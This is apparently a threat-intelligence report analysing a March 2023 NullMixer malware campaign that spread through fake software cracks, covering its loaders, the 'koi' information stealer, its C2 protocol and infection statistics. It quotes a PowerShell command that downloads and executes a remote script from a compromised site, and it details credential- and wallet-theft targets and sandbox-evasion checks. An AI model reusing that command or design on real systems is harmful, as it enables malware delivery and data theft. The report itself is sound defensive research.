Executive Summary
Our insights into a recent NullMixer malware operation revealed Italy and France are
the favorite European countries from the opportunistic attackers’ perspective.
In thirty days, the operation we monitored was capable to establish initial access to
over 8 thousand endpoints and steal sensitive data that are now reaching the
underground black markets.

1/13

Most of the victims mount Windows 10 Professional and Enterprise operating systems,
including several Datacenter versions of Windows Server. Some of them are also
Windows Embedded, indicating the penetration of such malware operation even into
IoT environments.
The NullMixer package is including new polymorphic loaders by third parties MaaS and
PPI service providers in the underground markets, and also pieces of controversial,
potentially North-Korean linked PseudoManuscript code.

Introduction
During March 2023, we obtained information and data regarding an ongoing malware
operation hitting more than 8.000 targets within a few weeks, with a particular emphasis on
North American, Italian, and French targets.
Such was related to a worldwide malware operation known as NullMixer, a controversial and
widespread malware delivery maneuver based on SEO poisoning and social engineering
technique to lure tech-savvy users, including IT personnel.
The insight from this attack wave revealed the presence of a controversial piece of code in
the delivered payloads, among additional loaders related to new MaaS and PPI operators.

Technical Analysis
There are two main key areas we technically analyzed during this investigation: first of all the
presence of two unknown loaders entering the MaaS and PPI businesses (CrashedLoader
and Koi), along with the presence of a controversial, potentially North-Korean linked piece of
malware, and secondly, we analyzed data about current successful infection rates on
targeted hosts.

The Originating Malvertising Campaign
According to CTI investigation on the adversary infrastructure, we were able to identify an
ongoing campaign luring system administrators to install the malicious code into their
machines. In particular, the identified attack wave was designed to trick users to install
backdoored, cracked versions of notorious PC maintenance software such as “EaseUS
Partition Master” and “Driver Easy Pro”, two well-known tools within the IT community.
Filename: Driver Easy Pro Crack.exe
MD5: 324db70fad161852fb9a12b202b6c8ad
Investigations end up in a series of Youtube videos promoting cracks for such programs. One
of them presented a masked, hooded male hacker explaining how to use the crack linked in
the video description. The threat actor abused Bitly shortener and an ad hoc BlogSpot

account to protect the malicious code, lastly stored in an encrypted zip archive hosted on
Mega.nz.

This particular modus operandi matches a particular threat Kaspersky researchers spotted in
September 2022 (link): NullMixer. NullMixer is a worldwide spread criminal operation
designed to provide infection services to an oodle of criminal threat actors. In fact, its
operators packed a multitude of malware into a single vector and then abused social
engineering, SEO poisoning, and malvertising techniques to lure their victims into running
their payloads.
NullMixer is maintaining the same lure topic since September 2022, advertising fake
software pirate cracks targeting tech-savvy users and potentially even IT personnel and
freelancers.
During their March 2023 infection wave, they evolved their social engineering techniques by
producing the above-mentioned YouTube videos containing instructions to download and run
the backdoored pirate software.

Despite that evolution, NullMixer’s initial payload remains substantially the same: a WinRAR
executable archive containing multiple binaries configured to be auto-launched on click. All at
the same time.

This plethora of malicious code related to different threat actors gives us the chance to better
understand the evolutions in the cybercriminal underground. In fact, aside from the wellknown off-the-shelf info stealer we also observed the presence of more peculiar pieces of
code, including other unconventional malware loader services.
Crack.exe, likely a “PseudoManuscrypt” loader, a particular kind of threat known since
June 2021 that Kaspersky attributes to the Chinese threat landscape, but, at the
moment, the speculation of the Lazarus (APT38) authorship of this piece of code does
not benefit enough confidence (, ).
Brg.exe, a common RacconStealer with its command and control server hosted by
VDSina, a Russian cloud provider.
Lower.exe, a sample of “GCleaner” spyware, historically, this piece of malware was
initially faking CCleaner to drop additional malware ().
Sqlcmd.exe, an interesting information stealer and dropper leveraging custom ECC
cryptography to secure its communication (details below)
KiffAppE2.exe, Crashtech Loader, a new loader service operating since November
2022, malware details in the following subsection.

3/13

ss29.exe, a particular dropper loading a Fabookie wallet stealer retrieved from a jpeg
image, also leverages a google cloud endpoint to serve malicious PAC files to
configure interception using an external HTTP proxy (T1090.002)
The following subsections will highlight some of the above-mentioned samples, especially
the loader ones to aim for a better understanding of the current MaaS landscape.

The CrashedTech Loader
The “KiffAppE2.exe” file is worth mentioning because it works as a secondary loader. This
loader appeared in the security community in November 2022 thanks to @fr3dhk, which
gave it its current name “CrashedTech Loader” and its panel has already been added to the
“What Is This C2” collection (link).
Filename: KiffAppE2.exe
Hash: 53f9c2f2f1a755fc04130fd5e9fcaff4
The “KiffAppE2.exe” file is a .NET binary masking the loader code in plain sight, basically, it
launches the loader code before showing the application form. It also checks a particular
registry key “KiffAppApi” under the HKCU hive to make sure the victim has not been already
infected, reasonably this would likely hurt the actor PPI model.
Figure. Loader entry point
The loader code is pretty straightforward its main logic consists of two steps. First, it does a
check-in providing user-name, os version, and public IP information to the “/addnew.php”
endpoint on the C2, then it parses the server response to extract the location where to
download further payloads. After this, it downloads the payload and executes it through the
“Process.Start” .NET API.
Figure. Loader checking and launch body
During March 2023, this particular loader was dropping at least two distinct RedLine Stealer
payloads configured to connect back to C2 servers hosted by the Ukrainian hosting provider
Timehost.

The “Koi” Stealer/Loader
Another interesting piece of malware embedded in the NullMixer campaign we reference as
ATK-16 is the “sqlcmd.exe” binary, a 32bit MSVC binary.
Filename: sqlcmd.exe
Hash: 6ffbbca108cfe838ca7138e381df210d

4/13

At a high level, the main routine of this loader does two things: insistently tries to download
multiple executable files with the name pattern “ab[NUMBER].php” and “ab[NUMBER].exe”
from a statically configured location, and runs an additional inline PowerShell command to
download and execute more code.
Figure. Command string to retrieve executable PowerShell code
“C:\WINDOWS\sysnative\cmd.exe” /c “powershell -command IEX(New-Object
Net.Webclient).DownloadString(‘https://neutropharma .com/wp/wpcontent/debug2.ps1’)”
This particular sample of the loader downloads the PowerShell script from a Pakistani
compromised WordPress site. The typical names we observed to be downloaded are
“debug2.ps1”, “debug20.ps1”, “debug4.ps1” and so on. The downloaded script contains a
long chunk of bytes and a sort of decryption routine base on a textbook-looking xor
operation, after that, the resulting bytes are loaded as a .NET assembly module.
Figure. Binary encoded data inside PowerShell and decryption routine.
The key to decrypting the embedded code is served through an external check-in service,
implementing a multi-stage polymorphic protection scheme. Such initial C2 service also
provides additional malware configuration including campaign Id and additional command
and control locations.
Figure. Dynamic configuration served by the C2
During March 2023, the resulting binary is a .NET file packed with ConfuseEx v1.0.0. Once
decoded, the malicious payload results in a .NET module named “koi” and implements
information stealer functionalities such as password stealing from FileZilla, Chrome browser,
and Discord, crypto-wallets stealing, Telegram folder exfiltration, Vpn configurations, and it
also looks for the presence of hardware wallet like Trezor, probably to identify high-value
targets for cryptocurrency theft. The module also exfiltrates 2FA secrets from Twilio’s Authy
local storage.
Filename: “koi” (dumped)
Hash: 9725ec075e92e25ea5b6e99c35c7aa74
Before starting all these collection operations, the “koi” module invokes the “checkVal”
function to avoid unwanted targets. In particular, it uses mutex “99759703-b8b4–4cb2–8329–
76f908b004f0” to avoid re-infection and also checks for the presence of video controller of
the Wine emulation framework, along with common user names and computer names used
by sandboxes or by AV emulation routines.

The module also avoids the execution of the malicious stealer routines if the system
language is set to one of the values representing the CIS countries:

AM: Armenia
BY: Belarus
KZ: Kazakhstan
KG: Kyrgyzstan
MD: Moldova
RU: Russia
TJ: Tajikistan
TM: Turkmenistan
UZ: Uzbekistan

After that, the “koi” module starts gathering information about system installed software and
sets up a communication channel with the command and control service received as a
startup parameter, in this case, the Latvian IP address 195.123.211,56.
This malware communicates with its command and control in a curious manner: it redirects
certain memory streams directly to the remote server, this way, malware authors were able to
avoid touching the disk even to lay temporary data before exfiltration. The first message sent
to the C2 starts with the “CONFIG|” keyword and contains check-in information among with
the campaign Id passed to the module via its PowerShell loader. Then, C2 triages the
infected host and responds in two possible ways: if “D” is returned, the “koi” module stops its
operations, otherwise, the command would contain additional commands and the malicious
code starts gathering even more data from the infected host.
In detail, a valid response from the C2 server would look like this:
LDR “|” (DO|AND|OR) “|” (On|Off) “|” ( list “,” list “,” .. ) “|” url “|” suffix
Here the C2 server asks the bot to download and execute an additional payload from the
remote location specified as “url”.
All these communications happen in plain HTTP, but despite that, messages are not easy to
spot because the “koi” module encrypts messages using a custom protocol based on ECC
encryption.
Figure. Classes in the “koi” module
In fact, the C2 communication leverages custom implementation ECC with Curve25519 to
generate a shared secret key that would be used to encrypt the otherwise plain HTTP body.
In particular, the communication protection scheme of this piece of malware works as
follows:
The server “peer-key” is hardcoded into the packed .NET module’s Main function.
Bots “public-key” and “private-key” are randomly generated at process startup time.
6/13

A shared secret is computed starting from the bots’ “private-key” and the server’s
“peer-key”.
The shared secret is used to encrypt the GZipped memory stream using a xor-based
algorithm in a compress-then-encrypt fashion.
Figure. Shared Secret methods from Curve25519 implementation
To make all this work, the final message sent to the C2 server will also need to contain the
bot “public-key” and here a detection opportunity emerges: the HTTP body of the generated
request is created concatenating 32 bytes of the randomly generated bot “public-key”, a
static separator “K”, and then the encrypted stream.

Attack Wave Insights
Based on the analysis of the C2 infrastructures involved in this NullMixer wave (ATK-16), we
obtained insights about successfully infected hosts. In particular, we were able to obtain
evidence of the successful execution of at least one of the payloads within the target
machines.
The NullMixer operations we dissected (ATK-16) count victims in at least 87 countries. With
an average infraction rate of 297 new victims per day, the malicious actors behind hit over 8
thousand in less than 30 days. Peaks of operations show an intensification of the activities
starting from the 28th of February 2023 when the infection rate jumped sensibly higher.
Figure. Reconstruction of the infection operations activities.

Impacted Countries
During the March spike period, the malicious operators significantly expanded their
campaign among countries outside North America: this wave hit many European countries
including Italy (4.57%, in fourth position) and France (3.38%, in sixth position).

Starting from the infected hosts’ data available, the infection progression shows the clear
horizontal expansion of the attacked surface corresponding to the above-mentioned peak on
the 28th of February.

Target Profile

7/13

As we expected the majority of the targeted hosts mount Microsoft client operations systems:
56.8 % Windows 10 Pro and 25.35 % Windows 10 Home, indicating major of the targets are
micro or small businesses or private users. Despite that, we noticed interesting outliers, 5.3
% of the victims mount the Enterprise version of the Microsoft OS, and almost 71 hosts also
mount the Windows Server version of the Microsoft operating system.
The majority of the data extracted from the victims will likely reach the underground dark
markets soon, but for this latest portion of infected hosts the risk is even higher: the operator
will likely try to sell access to these servers and enterprise machines to even more
dangerous thirds parties, including well-known ransomware operators.
Figure. Operating systems of infected machines
In the end, we also noticed that five machines that got infected were running even a rarer
version of the Microsoft operating system: Windows Embedded, an indication that even
Windows-based IoT devices have been hit by this campaign.

Conclusions
After 9 months, the NullMixer operation evolved leveraging malicious video tutorials
increasing its penetration on tech-savvy users and revealing new potential players in the
MaaS ecosystems.
The data we accessed during this investigation lighted up the impacted victims of their latest
campaign, revealing Italy as the first European target hit by the March 2023 infection wave.
During the recent period, Italy has been heavily targeted by cyber attacks, especially from
young collectives of cyber-partisans supporting the Kremlin’s propaganda such as Killnet and
NoName057. Such criminals base their operations on volunteer and micro-criminal labor
forces typically among the eastern CIS countries, for this reason, a spike observing such
penetration against Italian hosts becomes particularly interesting, especially with the current
geopolitical and cyber temperature against the Italian peninsula.
Technical details of the victims, adversary infrastructure, and indicators of compromise have
been shared with local authorities and the national CSIRT.
